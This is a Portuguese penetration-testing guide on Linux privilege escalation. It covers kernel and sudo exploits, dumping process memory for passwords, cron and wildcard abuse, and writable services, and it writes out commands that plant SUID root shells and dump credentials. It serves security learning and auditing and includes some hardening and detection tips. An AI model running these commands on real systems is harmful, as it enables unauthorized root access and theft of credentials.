# Escalação de Privilégios no Linux

{{#include ../../../banners/hacktricks-training.md}}

Para um contexto mais amplo e workflows históricos de enumeration, compare os recursos g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation e linux-private-i listados nas referências.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informações do Sistema

### Informações do SO

Vamos começar obtendo informações sobre o SO em execução.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Se você **tiver permissões de escrita em qualquer pasta dentro da variável `PATH`**, talvez consiga sequestrar algumas bibliotecas ou binários:

```bash
echo $PATH
```

### Informações do ambiente

Informações interessantes, senhas ou API keys nas variáveis de ambiente?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Verifique a versão do kernel e se existe algum exploit que possa ser usado para escalar privilégios.

A [seção Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) reúne casos de escalada local e links para análises mais aprofundadas do kernel Linux em Binary Exploitation. Verifique o build e a configuração afetados antes de testar um estudo de caso.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Você pode encontrar uma boa lista de kernels vulneráveis e alguns **exploits compilados** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Outros sites onde você pode encontrar **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões de kernel vulneráveis desse site, você pode fazer:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Ferramentas que podem ajudar a procurar exploits para o kernel:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute NA vítima; verifica exploits apenas para o kernel 2.x)

Sempre **pesquise a versão do kernel no Google**; talvez a versão do seu kernel esteja mencionada em algum exploit e, assim, você terá certeza de que ele é válido.

Técnicas adicionais de exploração do kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalação de privilégios no Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Versão do sudo

Com base nas versões vulneráveis do sudo que aparecem em:

```bash
searchsploit sudo
```

Você pode verificar se a versão do sudo está vulnerável usando este grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

O sudo upstream **1.9.14 até 1.9.17** permite que usuários locais sem privilégios escalem para root por meio da opção `--chroot` quando o sudo carrega `/etc/nsswitch.conf` de um diretório controlado pelo usuário; o upstream corrigiu isso na versão **1.9.17p1**. Verifique todos os binários sudo executáveis com setuid de root nos caminhos relevantes, pois `sudo -V` informa apenas o binário selecionado por `PATH`. Pacotes de distribuições podem incluir a correção sem alterar a string de versão upstream, portanto verifique também o status do pacote do fornecedor. Consulte o [comunicado do mantenedor do sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Aqui está uma [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explorar essa [vulnerabilidade](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de executar o exploit, certifique-se de que sua versão do `sudo` é vulnerável e oferece suporte ao recurso `chroot`.

Para mais informações, consulte o [comunicado original sobre a vulnerabilidade](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Bypass de regras do sudo baseadas em host (CVE-2025-32462)

O sudo upstream **1.8.8 até 1.9.17** pode avaliar regras do sudoers baseadas em host usando o **hostname fornecido pelo usuário** com `sudo -h <host>`, em vez do **hostname real**; o upstream corrigiu isso na versão **1.9.17p1**. O usuário ainda precisa ter uma entrada correspondente no sudoers do host selecionado. Verifique também as correções retroportadas pelo fornecedor e os binários sudo alternativos, além da política local. Consulte o [comunicado do mantenedor do sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Requisitos:
- Versão vulnerável do sudo
- Regras do sudoers específicas para o host (o host não é nem o hostname atual nem `ALL`)

Exemplo de padrão do sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit por meio de spoofing do host permitido:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Se a resolução do nome selecionado bloquear, verifique como esse nome é resolvido no host. A simples presença de um nome em um log ou arquivo de configuração não significa que ele possa ser resolvido, e alterar `/etc/hosts` normalmente exige acesso de escrita privilegiado.

#### sudo < v1.8.28

Este [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) exige uma regra sudo efetiva que permita executar um comando como qualquer usuário, exceto root, como `(ALL, !root) /bin/bash`. O usuário que faz a chamada também precisa ter permissão para usar essa regra, incluindo qualquer requisito de autenticação. Consulte o aviso do pacote instalado: os fornecedores incluíram o patch em versões cuja versão upstream exibida ainda é anterior à 1.8.28. Uma regra `!root` ou uma versão antiga, isoladamente, não confirma a vulnerabilidade. Não teste um comando privilegiado durante a enumeração passiva.

```
sudo -u#-1 /bin/bash
```

### Falha na verificação da assinatura do Dmesg

Confira a box **smasher2 do HTB** para ver um **exemplo** de como essa vuln poderia ser explorada.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Mais enumeração do sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Enumerar possíveis defesas

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Se você estiver dentro de um container, comece pela seção de segurança de containers a seguir e depois passe para as páginas de abuso específicas do runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Discos

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar se há informações privadas.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Software útil

Enumere binários úteis

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Além disso, verifique se **algum compilador está instalado**. Isso é útil caso precise usar algum exploit de kernel, pois é recomendável compilá-lo na máquina em que você vai usá-lo (ou em uma semelhante)

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Software vulnerável instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez haja uma versão antiga do Nagios, por exemplo, que possa ser explorada para escalar privilégios…\
Recomenda-se verificar manualmente a versão dos softwares instalados mais suspeitos.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Se você tiver acesso SSH à máquina, também poderá usar **openVAS** para verificar se há softwares desatualizados e vulneráveis instalados na máquina.

> [!NOTE] > _Observe que esses comandos mostrarão muitas informações que, em sua maioria, serão inúteis. Portanto, é recomendável usar alguns aplicativos, como o OpenVAS ou similares, para verificar se alguma versão de software instalada está vulnerável a exploits conhecidos._

## Processos

Veja **quais processos** estão sendo executados e verifique se algum deles tem **mais privilégios do que deveria** (talvez um tomcat sendo executado pelo root?).

```bash
ps aux
ps -ef
top -n 1
```

Verifique sempre se há [**depuradores de electron/cef/chromium** em execução; você pode abusar deles para escalar privilégios](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** os detecta verificando o parâmetro `--inspect` na linha de comando do processo.\
Verifique também **seus privilégios sobre os binários dos processos**; talvez você consiga sobrescrever algum deles.

### Cadeias pai-filho entre usuários

Um processo filho executado sob um **usuário diferente** do processo pai não é automaticamente malicioso, mas é um **sinal útil para triagem**. Algumas transições são esperadas (`root` iniciando um usuário de serviço, gerenciadores de login criando processos de sessão), mas cadeias incomuns podem revelar wrappers, ferramentas de depuração, persistência ou limites fracos de confiança em tempo de execução.

Revisão rápida:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Se encontrar uma cadeia surpreendente, inspecione a linha de comando do processo pai e todos os arquivos que influenciam seu comportamento (`config`, `EnvironmentFile`, scripts auxiliares, diretório de trabalho, argumentos graváveis). Em vários caminhos reais de privesc, o processo filho não era gravável, mas a **configuração controlada pelo processo pai** ou a cadeia de scripts auxiliares era.

### Executáveis excluídos e arquivos abertos após exclusão

Artefatos de tempo de execução muitas vezes continuam acessíveis **após a exclusão**. Isso é útil tanto para escalonamento de privilégios quanto para recuperar evidências de um processo que já está com arquivos confidenciais abertos.

Verifique se há executáveis excluídos:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Se `/proc/<PID>/exe` aponta para `(deleted)`, o processo ainda está executando a imagem binária antiga a partir da memória. Esse é um forte sinal para investigar, porque:

- o executável removido pode conter strings ou credenciais interessantes
- o processo em execução ainda pode expor descritores de arquivo úteis
- um binário privilegiado removido pode indicar adulteração recente ou tentativa de limpeza

Colete globalmente arquivos removidos que permanecem abertos:

```bash
lsof +L1
```

Se encontrar um descritor interessante, recupere-o diretamente:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Isso é especialmente valioso quando um processo ainda mantém aberto um segredo excluído, um script, uma exportação de banco de dados ou um arquivo com uma flag.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis que são executados com frequência ou quando um conjunto de requisitos é atendido.

#### Linux ProcMon com sudo

O [ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) pode rastrear processos e chamadas de sistema selecionados e salvar um rastreamento SQLite. Se `sudo -l` permitir executar um comando `procmon` irrestrito com capacidade de root, avalie se ele poderia observar a entrada ou a saída do processo de outro usuário. Essa permissão é apenas um ponto de partida para análise: o suporte do tracer, a política efetiva e a atividade de um processo adequado são fatores importantes. Os arquivos de rastreamento podem conter segredos; portanto, examine cuidadosamente as exportações autorizadas e evite coletar dados de processos não relacionados.

### Memória de processos

Alguns serviços de um servidor armazenam **credenciais em texto simples na memória**.\
Normalmente, você precisará de **privilégios de root** para ler a memória de processos pertencentes a outros usuários. Por isso, isso costuma ser mais útil quando você já é root e quer descobrir mais credenciais.\
No entanto, lembre-se de que **como usuário comum, você pode ler a memória dos processos que possui**.

> [!WARNING]
> Observe que hoje em dia a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode despejar outros processos pertencentes ao seu usuário sem privilégios.
>
> O arquivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla a acessibilidade do ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Essa é a forma clássica de funcionamento do ptrace.
> - **kernel.yama.ptrace_scope = 1**: somente um processo pai pode ser depurado.
> - **kernel.yama.ptrace_scope = 2**: somente o administrador pode usar ptrace, pois é necessária a capacidade CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nenhum processo pode ser rastreado com ptrace. Depois de definido, é necessário reiniciar o sistema para habilitar o ptrace novamente.

Um processo com o mesmo UID que desbloqueia brevemente um cofre de senhas pode constituir um limite de credenciais separado. Quando o rastreamento é permitido, um processo ativo e que permite despejo pode expor a senha do cofre por meio de suas chamadas de sistema de entrada ou da memória, mesmo que o próprio arquivo do cofre criptografado permaneça protegido. `ptrace_scope=0` é apenas um dos pré-requisitos: credenciais correspondentes, permissão de despejo do alvo, outros módulos de segurança do Linux e o tempo de vida do processo também são relevantes. Para que uma entrada do cofre permita um login Unix como root, é necessário verificar separadamente a reutilização da credencial. A enumeração de rotina deve informar a política e os caminhos de possíveis processos ou cofres, sem capturar entradas nem exibir segredos. Consulte a [documentação do Yama do kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) e as [verificações de acesso do ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Se você tiver acesso à memória de um serviço FTP, por exemplo, poderá obter o Heap e pesquisar as credenciais nele.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script do GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado ID de processo, **maps mostra como a memória está mapeada no espaço de endereços virtual desse processo**; também mostra as **permissões de cada região mapeada**. O arquivo pseudo **mem expõe a própria memória do processo**. Pelo arquivo **maps**, sabemos quais **regiões de memória são legíveis** e seus deslocamentos. Usamos essas informações para **posicionar-se no arquivo mem e despejar todas as regiões legíveis** em um arquivo.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereçamento virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só pode ser lido por **root** e pelo grupo **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump para Linux

ProcDump é uma reimaginação para Linux da clássica ferramenta ProcDump do conjunto de ferramentas Sysinternals para Windows. Obtenha-a em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Ferramentas

Para despejar a memória de um processo, você pode usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e despejar a memória do processo pertencente a você
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root é necessário)

### Credenciais da memória do processo

#### Exemplo manual

Se você descobrir que o processo autenticador está em execução:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Você pode fazer dump do processo (consulte as seções anteriores para encontrar diferentes maneiras de fazer dump da memória de um processo) e procurar credenciais na memória:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) vai **roubar credenciais em texto simples da memória** e de alguns **arquivos conhecidos**. Ela precisa de privilégios de root para funcionar corretamente.

| Recurso                                           | Nome do processo    |
| ------------------------------------------------- | ------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password        |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm             |
| VSFTPd (conexões FTP ativas)                      | vsftpd              |
| Apache2 (sessões HTTP Basic Auth ativas)          | apache2             |
| OpenSSH (sessões SSH ativas — uso do Sudo)         | sshd:               |

#### Regexes de busca/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Tarefas agendadas/Cron

### Crontab UI (alseambusher) executando como root – privesc pelo agendador baseado na web

Se um painel web “Crontab UI” (alseambusher/crontab-ui) é executado como root e está vinculado apenas ao loopback, você ainda pode acessá-lo por meio de encaminhamento de porta local via SSH e criar uma tarefa privilegiada para escalar privilégios.<sup>[[1]](#references)[[4]](#references)</sup>

Cadeia típica
- Descubra a porta acessível apenas pelo loopback (por exemplo, 127.0.0.1:8000) e o realm de Basic-Auth usando `ss -ntlp` / `curl -v localhost:8000`
- Encontre credenciais em artefatos operacionais:
  - Backups/scripts com `zip -P <password>`
  - Unidade systemd que expõe `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crie o túnel e faça login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crie um job com privilégios elevados e execute-o imediatamente (cria um shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Use-o:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Não execute a interface do Crontab como root; restrinja-a a um usuário dedicado e a permissões mínimas
- Vincule-a ao localhost e restrinja o acesso também por firewall/VPN; não reutilize senhas
- Evite incluir segredos em arquivos unit; use secret stores ou arquivos EnvironmentFile acessíveis apenas pelo root
- Ative auditoria/logging para execuções de jobs sob demanda

Verifique se algum job agendado é vulnerável. Talvez você possa tirar proveito de um script executado pelo root (vulnerabilidade de wildcard? É possível modificar arquivos usados pelo root? Usar symlinks? Criar arquivos específicos no diretório usado pelo root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Se `run-parts` for usado, verifique quais nomes serão realmente executados:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Isso evita falsos positivos. Um diretório periódico com permissão de escrita só é útil se o nome do arquivo do seu payload corresponder às regras locais do `run-parts`.

### Caminho do Cron

Por exemplo, dentro de _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe que o usuário "user" tem permissões de escrita em /home/user_)

Se, dentro deste crontab, o usuário root tentar executar algum comando ou script sem definir o caminho. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter um shell root usando:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron usando um script com um curinga (Wildcard Injection)

Se um script executado pelo root tiver um “**\***” dentro de um comando, você pode explorar isso para fazer coisas inesperadas (como privesc). Exemplo:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Se o wildcard for precedido por um caminho como** _**/some/path/\***_ **, não é vulnerável (nem mesmo** _**./\***_ **).**

Leia a página a seguir para conhecer outros truques de exploração de wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injeção via expansão aritmética do Bash em analisadores de logs do cron

A aritmética do Bash pode interpretar texto não confiável como uma expressão. Em contextos afetados do Bash, um índice de array dentro dessa expressão pode avaliar uma substituição de comando. Se um parser privilegiado do cron inserir texto de log controlado pelo atacante em uma comparação aritmética desse tipo, a substituição poderá ser executada com a identidade do parser.<sup>[[22]](#references)</sup> Isso depende da expressão e da versão exatas do Bash; uma string simples `$(...)0` em uma variável expandida não é, por si só, uma demonstração confiável de reavaliação.

A entrada também pode vir de metadados de arquivo ou de outro campo lido de um local gravável pelo usuário. Por exemplo, um script privilegiado de limpeza que lê uma tag `Producer` de uma imagem e a compara usando `[[ "$producer" -eq "expected" ]]` realiza uma comparação aritmética, embora a variável esteja entre aspas. Verifique a identidade usada na tarefa agendada, quais arquivos podem fornecer a tag, quaisquer transformações feitas antes da comparação e o comportamento exato do Bash. Para rótulos de texto, use uma comparação de strings; para números, valide que a entrada contenha apenas dígitos decimais antes de usá-la em operações aritméticas. Consulte as [regras de aritmética do Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Padrão vulnerável típico:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sondagem segura do comportamento local do mecanismo de subscrito de array (sem processo privilegiado nem alteração de arquivo):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Trace o script agendado real e o caminho literal de entrada que ele abre. Mesmo quando o próprio arquivo de log não pode ser gravado, um usuário que pode gravar e acessar o diretório pai sem sticky bit talvez consiga substituir sua entrada; `namei -l` ajuda a distinguir essas permissões. Um caminho de log diferente que possa ser gravado, um agendador ilegível ou um parser que nunca avalia esse campo como aritmética Bash não comprova essa possibilidade.

### Sobrescrita de script do Cron e symlink

Se você **pode modificar um script do cron** executado como root, pode obter um shell com muita facilidade:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Se o script executado pelo root usa um **diretório ao qual você tem acesso total**, talvez seja útil excluir essa pasta e **criar um link simbólico para outro diretório** que sirva um script controlado por você.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validação de symlink e tratamento mais seguro de arquivos

Ao revisar scripts/binários privilegiados que leem ou gravam arquivos por caminho, verifique como os links são tratados:

- `stat()` segue um symlink e retorna os metadados do destino.
- `lstat()` retorna os metadados do próprio link.
- `readlink -f` e `namei -l` ajudam a resolver o destino final e mostram as permissões de cada componente do caminho.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Para defensores/desenvolvedores, padrões mais seguros contra truques com symlinks incluem:

- `O_EXCL` com `O_CREAT`: falha se o caminho já existir (bloqueia links/arquivos pré-criados pelo atacante).
- `openat()`: opera em relação a um descritor de arquivo de diretório confiável.
- `mkstemp()`: cria arquivos temporários atomicamente com permissões seguras.

### Binários de cron com assinatura personalizada e payloads graváveis
Um usuário comum que possa gravar no binário exato executado por um cron job de root pode atravessar uma fronteira de privilégios, mas uma verificação de assinatura personalizada pode rejeitar uma substituição sem assinatura. No caso documentado, o ELF pertencente ao root tinha modo `0760`, permitindo que um membro do grupo o modificasse, enquanto o proprietário root podia executá-lo. Um rastreamento visível do processo mostrou o `objcopy` extraindo `.text_sig` antes de o job executar o binário; o script completo do verificador não estava legível.<sup>[[2]](#references)</sup>

A substituição que funcionou foi assinada com material de assinatura privado vazado, usando um assinador de ELF. A [documentação do formato](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) descreve uma seção de assinatura derivada do `.text` do executável. Não foi demonstrado que simplesmente adicionar um certificado ou uma string correspondente a `.text_sig` satisfaça o verificador não visível. Verifique o caminho agendado real, o acesso efetivo de gravação, a invocação pelo root e a política do verificador antes de concluir que um binário gravável e assinado é explorável. Uma seção `.text_sig`, por si só, é apenas uma pista para análise.

### Jobs de cron frequentes

Você pode monitorar os processos para procurar processos que sejam executados a cada 1, 2 ou 5 minutos. Talvez você possa tirar proveito disso e escalar privilégios.

Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos executados com menos frequência** e excluir os comandos que foram executados mais vezes, você pode fazer:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso monitorará e listará cada processo iniciado).

### Backups de root que preservam bits de modo definidos pelo atacante (pg_basebackup)

Se um cron executado como root usar `pg_basebackup` (ou qualquer cópia recursiva) em um diretório de banco de dados no qual você pode escrever, você pode plantar um **binário SUID/SGID** que será copiado novamente como **root:root**, com os mesmos bits de modo, para o diretório de backup.<sup>[[26]](#references)</sup>

Fluxo típico de descoberta (como usuário de DB com poucos privilégios):
- Use `pspy` para identificar um cron de root que execute algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` a cada minuto.
- Confirme que o cluster de origem (por exemplo, `/var/lib/postgresql/14/main`) permite escrita por você e que o destino (`/opt/backups/current`) passa a pertencer a root após a execução do job.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Isso funciona porque `pg_basebackup` preserva os bits de modo dos arquivos ao copiar o cluster; quando executado por root, os arquivos de destino herdam **a propriedade de root + SUID/SGID escolhido pelo atacante**. Qualquer rotina de backup/cópia privilegiada semelhante que mantenha as permissões e grave em um local executável é vulnerável.

### Tarefas cron invisíveis

É possível criar uma tarefa cron **colocando um retorno de carro após um comentário** (sem caractere de nova linha), e a tarefa cron funcionará. Exemplo (observe o caractere de retorno de carro):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Para detectar esse tipo de entrada furtiva, inspecione os arquivos cron com ferramentas que exibam caracteres de controle:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Serviços

### Arquivos _.service_ graváveis

Verifique se você consegue escrever em algum arquivo `.service`. Se conseguir, **poderá modificá-lo** para que **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez seja necessário esperar até que a máquina seja reiniciada).\
Por exemplo, crie seu backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Lembre-se de que, se você tiver **permissões de escrita sobre binários executados por serviços**, poderá substituí-los por backdoors para que, quando os serviços forem executados novamente, os backdoors sejam executados.

### PATH do systemd - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:

```bash
systemctl show-environment
```

